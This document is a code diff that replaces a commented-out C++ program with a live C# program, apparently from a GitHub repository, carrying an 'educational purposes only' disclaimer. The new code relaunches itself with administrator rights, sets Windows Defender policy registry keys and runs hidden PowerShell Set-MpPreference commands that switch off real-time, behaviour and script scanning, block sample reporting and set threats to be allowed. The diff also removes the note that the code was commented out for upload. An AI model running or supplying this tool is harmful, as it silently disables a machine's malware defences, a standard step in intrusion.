@@ -6,59 +6,82 @@
  * Disclaimer: This program is distributed for educational purposes only. Modifying system settings and disabling security features 
  * should only be done responsibly, with appropriate permissions, and in a controlled environment. 
  * 
- * The entire code has been commented out so it could be Uploaded to Github.
  */
 
-//#include <Windows.h>
-//#include <iostream>
-//
-//bool runAsAdmin() {
-//    BOOL isAdmin;
-//    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
-//    PSID AdministratorsGroup;
-//    isAdmin = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
-//                                       0, 0, 0, 0, 0, 0, &AdministratorsGroup);
-//    if (isAdmin) {
-//        if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
-//            isAdmin = FALSE;
-//        }
-//        FreeSid(AdministratorsGroup);
-//    }
-//    return isAdmin;
-//}
-//
-//void main() {
-//    if (!runAsAdmin()) {
-//        ShellExecute(NULL, "runas", "cmd.exe", "/c \"" __FILE__ "\"", NULL, SW_HIDE);
-//        return;
-//    }
-//
-//    HKEY hKey;
-//    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-//        DWORD value = 1;
-//        RegSetValueEx(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
-//        RegCloseKey(hKey);
-//    }
-//
-//    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-//        DWORD value = 1;
-//        RegSetValueEx(hKey, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
-//        RegSetValueEx(hKey, "DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
-//        RegSetValueEx(hKey, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
-//        RegSetValueEx(hKey, "DisableRawWriteNotification", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
-//        RegSetValueEx(hKey, "DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
-//        RegCloseKey(hKey);
-//    }
-//
-//    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
-//    system("powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
-//    system("powershell -Command \"Set-MpPreference -DisableBlockAtFirstSeen $true\"");
-//    system("powershell -Command \"Set-MpPreference -DisableIOAVProtection $true\"");
-//    system("powershell -Command \"Set-MpPreference -DisableScriptScanning $true\"");
-//    system("powershell -Command \"Set-MpPreference -SubmitSamplesConsent 2\"");
-//    system("powershell -Command \"Set-MpPreference -MAPSReporting 0\"");
-//    system("powershell -Command \"Set-MpPreference -HighThreatDefaultAction 6 -Force\"");
-//    system("powershell -Command \"Set-MpPreference -ModerateThreatDefaultAction 6\"");
-//    system("powershell -Command \"Set-MpPreference -LowThreatDefaultAction 6\"");
-//    system("powershell -Command \"Set-MpPreference -SevereThreatDefaultAction 6\"");
-//}
+using System;
+using System.Diagnostics;
+using Microsoft.Win32;
+
+class Program
+{
+    static void Main()
+    {
+        if (!IsUserAnAdmin())
+        {
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.Verb = "runas";
+            startInfo.FileName = Environment.GetCommandLineArgs()[0];
+            startInfo.Arguments = "/admin";
+            Process.Start(startInfo);
+            return;
+        }
+
+        try
+        {
+            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1, RegistryValueKind.DWord);
+
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", true);
+            if (key != null)
+            {
+                key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
+                key.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
+                key.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
+                key.SetValue("DisableRawWriteNotification", 1, RegistryValueKind.DWord);
+                key.SetValue("DisableIOAVProtection", 1, RegistryValueKind.DWord);
+                key.Close();
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Error: " + ex.Message);
+        }
+
+        RunPowerShellCommand("Set-MpPreference -DisableRealtimeMonitoring $true");
+        RunPowerShellCommand("Set-MpPreference -DisableBehaviorMonitoring $true");
+        RunPowerShellCommand("Set-MpPreference -DisableBlockAtFirstSeen $true");
+        RunPowerShellCommand("Set-MpPreference -DisableIOAVProtection $true");
+        RunPowerShellCommand("Set-MpPreference -DisableScriptScanning $true");
+        RunPowerShellCommand("Set-MpPreference -SubmitSamplesConsent 2");
+        RunPowerShellCommand("Set-MpPreference -MAPSReporting 0");
+        RunPowerShellCommand("Set-MpPreference -HighThreatDefaultAction 6 -Force");
+        RunPowerShellCommand("Set-MpPreference -ModerateThreatDefaultAction 6");
+        RunPowerShellCommand("Set-MpPreference -LowThreatDefaultAction 6");
+        RunPowerShellCommand("Set-MpPreference -SevereThreatDefaultAction 6");
+    }
+
+    static void RunPowerShellCommand(string command)
+    {
+        ProcessStartInfo startInfo = new ProcessStartInfo();
+        startInfo.FileName = "powershell.exe";
+        startInfo.Arguments = "-Command \"" + command + "\"";
+        startInfo.UseShellExecute = false;
+        startInfo.CreateNoWindow = true;
+        startInfo.RedirectStandardOutput = true;
+        Process process = new Process();
+        process.StartInfo = startInfo;
+        process.Start();
+        process.WaitForExit();
+    }
+
+    static bool IsUserAnAdmin()
+    {
+        try
+        {
+            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+        }
+        catch
+        {
+            return false;
+        }
+    }
+}
